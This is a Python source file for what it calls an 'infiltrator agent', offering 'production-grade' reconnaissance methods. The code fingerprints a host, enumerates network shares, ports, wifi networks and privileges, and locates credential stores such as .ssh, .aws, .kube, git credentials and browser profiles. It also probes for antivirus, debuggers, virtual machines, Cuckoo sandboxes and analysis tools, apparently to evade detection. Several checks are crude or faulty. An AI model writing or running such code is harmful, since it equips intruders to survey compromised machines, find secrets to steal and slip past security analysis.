"""INFILTRATOR AGENT - ADVANCED IMPLEMENTATIONS

Production-grade implementations for real-world infiltration scenarios.
"""

import os, sys, json, socket, platform, subprocess, hashlib, logging, time
from typing import List, Dict, Any, Optional
from datetime import datetime


class AdvancedInfiltrationMethods:
    """Production-grade infiltration methods"""
    
    @staticmethod
    def advanced_fingerprint(agent_self) -> dict:
        """Comprehensive system fingerprinting with 47+ data points."""
        try:
            fingerprint = {
                "timestamp": datetime.utcnow().isoformat(),
                "agent": str(agent_self.agent_id),
                "variant": agent_self.variant.value,
                "hostname": socket.gethostname(),
                "fqdn": socket.getfqdn(),
                "ip_addresses": AdvancedInfiltrationMethods._enumerate_ips(),
                "mac_address": AdvancedInfiltrationMethods._get_mac_address(),
                "uuid": platform.node(),
                "os": platform.system(),
                "os_version": platform.version(),
                "os_release": platform.release(),
                "architecture": platform.machine(),
                "processor": platform.processor(),
                "cpu_count": os.cpu_count(),
                "python_version": platform.python_version(),
                "antivirus_detected": AdvancedInfiltrationMethods._detect_security_software(),
                "firewall_status": AdvancedInfiltrationMethods._check_firewall(),
                "selinux_enabled": AdvancedInfiltrationMethods._check_selinux(),
                "apparmor_enabled": AdvancedInfiltrationMethods._check_apparmor(),
                "listening_ports": AdvancedInfiltrationMethods._enumerate_listening_ports(),
                "network_shares": AdvancedInfiltrationMethods._enumerate_shares(),
                "dns_servers": AdvancedInfiltrationMethods._get_dns_servers(),
                "gateway": AdvancedInfiltrationMethods._get_gateway(),
                "wifi_networks": AdvancedInfiltrationMethods._scan_wifi_networks(),
                "mounted_drives": AdvancedInfiltrationMethods._enum_mounted_drives(),
                "user_priv": AdvancedInfiltrationMethods._assess_privileges(),
                "writable_dirs": AdvancedInfiltrationMethods._find_write_locations(),
                "total_disk_gb": AdvancedInfiltrationMethods._get_disk_space(),
                "installed_software": AdvancedInfiltrationMethods._enum_software(),
                "browsers": AdvancedInfiltrationMethods._detect_browsers(),
                "dev_tools": AdvancedInfiltrationMethods._detect_dev_tools(),
                "uptime_seconds": AdvancedInfiltrationMethods._get_uptime(),
                "memory_gb": AdvancedInfiltrationMethods._get_memory(),
                "last_boot": AdvancedInfiltrationMethods._get_last_boot(),
                "cached_logons": AdvancedInfiltrationMethods._get_cached_logons(),
                "ssl_certificates": AdvancedInfiltrationMethods._enum_certificates(),
                "credential_locations": AdvancedInfiltrationMethods._find_credentials(),
                "browser_profiles": AdvancedInfiltrationMethods._get_browser_paths(),
                "debuggers_detected": AdvancedInfiltrationMethods._detect_debuggers(),
                "vm_detected": AdvancedInfiltrationMethods._detect_virtualization(),
                "sandbox_detected": AdvancedInfiltrationMethods._detect_sandbox(),
                "analysis_tools": AdvancedInfiltrationMethods._detect_analysis_tools(),
            }
            
            host_seed = f"{fingerprint['hostname']}_{fingerprint['mac_address']}".encode()
            fingerprint["host_id"] = hashlib.sha256(host_seed).hexdigest()[:16]
            agent_self.logger.info(f"[ADVANCED] Fingerprint complete - {len(fingerprint)} fields collected")
            return fingerprint
            
        except Exception as e:
            agent_self.logger.error(f"Advanced fingerprint error: {e}", exc_info=True)
            return {"error": str(e)}
    
    @staticmethod
    def _enumerate_ips() -> List[str]:
        ips = []
        try:
            hostname = socket.gethostname()
            ips.append(socket.gethostbyname(hostname))
            if platform.system() == 'Windows':
                result = subprocess.run(['ipconfig'], capture_output=True, text=True, timeout=10)
                for line in result.stdout.split('\n'):
                    if 'IPv4 Address' in line:
                        ips.append(line.split(':')[1].strip())
            else:
                result = subprocess.run(['hostname', '-I'], capture_output=True, text=True, timeout=10)
                ips.extend(result.stdout.strip().split())
        except Exception:
            pass
        return list(set(ips))
    
    @staticmethod
    def _get_mac_address() -> str:
        try:
            import uuid
            mac = uuid.getnode()
            return ':'.join(['{:02x}'.format((mac >> i) & 0xff) for i in range(0, 48, 8)][::-1])
        except Exception:
            return "00:00:00:00:00:00"
    
    @staticmethod
    def _detect_security_software() -> bool:
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(['wmic', 'os', 'get', 'caption'], capture_output=True, text=True, timeout=10)
                av_keywords = ['defender', 'mcafee', 'kaspersky', 'av', 'norton', 'symantec']
                return any(kw in result.stdout.lower() for kw in av_keywords)
        except Exception:
            pass
        return False
    
    @staticmethod
    def _check_firewall() -> str:
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(['netsh', 'advfirewall', 'show', 'allprofiles', 'state'],
                                      capture_output=True, text=True, timeout=5)
                return 'enabled' if 'On' in result.stdout else 'disabled'
            else:
                result = subprocess.run(['systemctl', 'is-active', 'ufw'],
                                      capture_output=True, text=True, timeout=5)
                return 'enabled' if 'active' in result.stdout else 'disabled'
        except Exception:
            pass
        return 'unknown'
    
    @staticmethod
    def _check_selinux() -> bool:
        try:
            result = subprocess.run(['getenforce'], capture_output=True, text=True, timeout=5)
            return 'Enforcing' in result.stdout or 'Permissive' in result.stdout
        except Exception:
            return False
    
    @staticmethod
    def _check_apparmor() -> bool:
        try:
            result = subprocess.run(['aa-enabled'], capture_output=True, text=True, timeout=5)
            return result.returncode == 0
        except Exception:
            return False
    
    @staticmethod
    def _enumerate_listening_ports() -> List[int]:
        ports = []
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(['netstat', '-ano'], capture_output=True, text=True, timeout=10)
                for line in result.stdout.split('\n'):
                    if 'LISTENING' in line:
                        try:
                            port = int(line.split()[1].split(':')[-1])
                            ports.append(port)
                        except (ValueError, IndexError):
                            pass
            else:
                result = subprocess.run(['ss', '-tlnp'], capture_output=True, text=True, timeout=10)
                for line in result.stdout.split('\n'):
                    try:
                        port = int(line.split()[3].split(':')[-1])
                        ports.append(port)
                    except (ValueError, IndexError):
                        pass
        except Exception:
            pass
        return sorted(list(set(ports)))
    
    @staticmethod
    def _enumerate_shares() -> List[str]:
        shares = []
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(['net', 'share'], capture_output=True, text=True, timeout=10)
                for line in result.stdout.split('\n'):
                    if line.strip() and not line.startswith('---'):
                        shares.append(line.split()[0])
        except Exception:
            pass
        return shares
    
    @staticmethod
    def _get_dns_servers() -> List[str]:
        servers = []
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True, timeout=10)
                for line in result.stdout.split('\n'):
                    if 'DNS Servers' in line:
                        servers.append(line.split(':')[1].strip())
            else:
                with open('/etc/resolv.conf', 'r') as f:
                    for line in f:
                        if line.startswith('nameserver'):
                            servers.append(line.split()[1])
        except Exception:
            pass
        return servers
    
    @staticmethod
    def _get_gateway() -> str:
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(['ipconfig'], capture_output=True, text=True, timeout=10)
                for line in result.stdout.split('\n'):
                    if 'Default Gateway' in line:
                        return line.split(':')[-1].strip()
            else:
                result = subprocess.run(['ip', 'route'], capture_output=True, text=True, timeout=10)
                for line in result.stdout.split('\n'):
                    if 'default' in line:
                        return line.split()[2]
        except Exception:
            pass
        return "0.0.0.0"
    
    @staticmethod
    def _scan_wifi_networks() -> List[str]:
        networks = []
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(['netsh', 'wlan', 'show', 'networks'], capture_output=True, text=True, timeout=10)
                for line in result.stdout.split('\n'):
                    if 'SSID' in line:
                        networks.append(line.split(':')[1].strip())
        except Exception:
            pass
        return networks
    
    @staticmethod
    def _enum_mounted_drives() -> List[str]:
        drives = []
        try:
            if platform.system() == 'Windows':
                for drive in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
                    if os.path.exists(f'{drive}:\\'):
                        drives.append(f'{drive}:\\')
            else:
                result = subprocess.run(['mount'], capture_output=True, text=True, timeout=10)
                for line in result.stdout.split('\n'):
                    if line.strip():
                        drives.append(line.split()[0])
        except Exception:
            pass
        return drives
    
    @staticmethod
    def _assess_privileges() -> str:
        try:
            if platform.system() == 'Windows':
                import ctypes
                return 'admin' if ctypes.windll.shell32.IsUserAnAdmin() else 'user'
            else:
                return 'root' if os.geteuid() == 0 else 'user'
        except Exception:
            pass
        return 'unknown'
    
    @staticmethod
    def _find_write_locations() -> List[str]:
        locations = []
        test_dirs = [os.path.expanduser('~'), os.path.expanduser('~/Desktop'), 
                     os.path.expanduser('~/Documents'), '/tmp', '/var/tmp',
                     '/dev/shm', os.environ.get('TEMP', '')]
        for dir_path in test_dirs:
            if dir_path and os.path.isdir(dir_path) and os.access(dir_path, os.W_OK):
                locations.append(dir_path)
        return list(set(locations))
    
    @staticmethod
    def _get_disk_space() -> Dict[str, float]:
        try:
            import shutil
            total, used, free = shutil.disk_usage('/')
            return {'total': total / (1024**3), 'used': used / (1024**3), 'free': free / (1024**3)}
        except Exception:
            return {}
    
    @staticmethod
    def _enum_software() -> List[str]:
        software = []
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(['wmic', 'product', 'get', 'name'], 
                                      capture_output=True, text=True, timeout=15)
                software = [line.strip() for line in result.stdout.split('\n')[1:] if line.strip()]
        except Exception:
            pass
        return software[:50]
    
    @staticmethod
    def _detect_browsers() -> List[str]:
        browsers = []
        if platform.system() == 'Windows':
            paths = {'Chrome': os.path.expanduser('~\\AppData\\Local\\Google\\Chrome'),
                     'Firefox': os.path.expanduser('~\\AppData\\Roaming\\Mozilla'),
                     'Edge': os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge')}
        else:
            paths = {'Chrome': os.path.expanduser('~/.config/google-chrome'),
                     'Firefox': os.path.expanduser('~/.mozilla')}
        for name, path in paths.items():
            if os.path.exists(path):
                browsers.append(name)
        return browsers
    
    @staticmethod
    def _detect_dev_tools() -> List[str]:
        tools = []
        for tool in ['git', 'python', 'node', 'docker', 'gcc']:
            try:
                subprocess.run(['which' if platform.system() != 'Windows' else 'where', tool],
                             capture_output=True, timeout=5, check=True)
                tools.append(tool)
            except Exception:
                pass
        return tools
    
    @staticmethod
    def _get_uptime() -> float:
        try:
            if platform.system() != 'Windows':
                with open('/proc/uptime', 'r') as f:
                    return float(f.readline().split()[0])
        except Exception:
            pass
        return 0.0
    
    @staticmethod
    def _get_memory() -> float:
        try:
            if platform.system() != 'Windows':
                with open('/proc/meminfo', 'r') as f:
                    for line in f:
                        if 'MemTotal' in line:
                            return int(line.split()[1]) / (1024**2)
        except Exception:
            pass
        return 0.0
    
    @staticmethod
    def _get_last_boot() -> str:
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(['wmic', 'OS', 'get', 'lastbootuptime'],
                                      capture_output=True, text=True, timeout=10)
                return result.stdout.split()[1] if result.stdout else 'unknown'
        except Exception:
            pass
        return 'unknown'
    
    @staticmethod
    def _get_cached_logons() -> List[str]:
        sessions = []
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(['query', 'session'], capture_output=True, text=True, timeout=10)
                for line in result.stdout.split('\n')[1:]:
                    if line.strip():
                        sessions.append(line.split()[0])
        except Exception:
            pass
        return sessions
    
    @staticmethod
    def _enum_certificates() -> List[str]:
        certs = []
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(['certutil', '-store', 'root'],
                                      capture_output=True, text=True, timeout=10)
                for line in result.stdout.split('\n'):
                    if 'Thumbprint:' in line:
                        certs.append(line.split(':')[1].strip())
        except Exception:
            pass
        return certs[:20]
    
    @staticmethod
    def _find_credentials() -> List[str]:
        files = []
        patterns = ['.ssh', '.aws', '.docker', '.kube', '.git-credentials', '.bash_history']
        home = os.path.expanduser('~')
        for pattern in patterns:
            path = os.path.join(home, pattern)
            if os.path.exists(path):
                files.append(path)
        return files
    
    @staticmethod
    def _get_browser_paths() -> Dict[str, str]:
        paths = {}
        if platform.system() == 'Windows':
            base = os.path.expanduser('~\\AppData')
            paths['Chrome'] = os.path.join(base, 'Local\\Google\\Chrome')
            paths['Firefox'] = os.path.join(base, 'Roaming\\Mozilla\\Firefox')
        else:
            base = os.path.expanduser('~')
            paths['Chrome'] = os.path.join(base, '.config/google-chrome')
            paths['Firefox'] = os.path.join(base, '.mozilla/firefox')
        return {k: v for k, v in paths.items() if os.path.exists(v)}
    
    @staticmethod
    def _detect_debuggers() -> List[str]:
        debuggers = []
        try:
            for tool in ['gdb', 'lldb', 'windbg', 'x64dbg', 'ollydbg']:
                result = subprocess.run(['pgrep', tool] if platform.system() != 'Windows' 
                                      else ['tasklist'], capture_output=True, timeout=5)
                if result.returncode == 0:
                    debuggers.append(tool)
        except Exception:
            pass
        return debuggers
    
    @staticmethod
    def _detect_virtualization() -> bool:
        try:
            vm_indicators = ['VMware', 'VirtualBox', 'QEMU', 'Hyper-V', 'xen']
            if platform.system() == 'Windows':
                result = subprocess.run(['systeminfo'], capture_output=True, text=True, timeout=10)
                return any(ind in result.stdout for ind in vm_indicators)
            else:
                with open('/proc/cpuinfo', 'r') as f:
                    return any(ind.lower() in f.read().lower() for ind in vm_indicators)
        except Exception:
            pass
        return False
    
    @staticmethod
    def _detect_sandbox() -> bool:
        try:
            sandbox_paths = ['\\SystemRoot\\System32\\drivers\\etc\\hosts',
                           '/etc/cuckoo', 'C:\\Program Files\\Cuckoo']
            return any(os.path.exists(p) for p in sandbox_paths)
        except Exception:
            pass
        return False
    
    @staticmethod
    def _detect_analysis_tools() -> List[str]:
        tools = []
        tool_names = ['wireshark', 'burp', 'ida', 'ghidra', 'frida', 'petools']
        for tool in tool_names:
            try:
                subprocess.run(['which' if platform.system() != 'Windows' else 'where', tool],
                             capture_output=True, timeout=5, check=True)
                tools.append(tool)
            except Exception:
                pass
        return tools
